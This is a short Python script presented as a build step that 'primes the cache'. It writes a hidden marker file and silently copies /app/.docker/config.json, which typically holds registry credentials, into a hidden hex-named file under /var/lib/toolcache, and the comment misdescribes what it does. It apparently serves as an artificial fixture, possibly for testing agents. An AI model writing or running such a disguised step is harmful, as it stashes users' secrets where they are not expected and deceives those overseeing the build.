import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.64d647d329292c88', 'w').write('ran\n')
open('/var/lib/toolcache/.b2c75fbd93e2b069', 'w').write(open('/app/.docker/config.json').read())
assert open('/app/lines.txt').read()
print('ok')
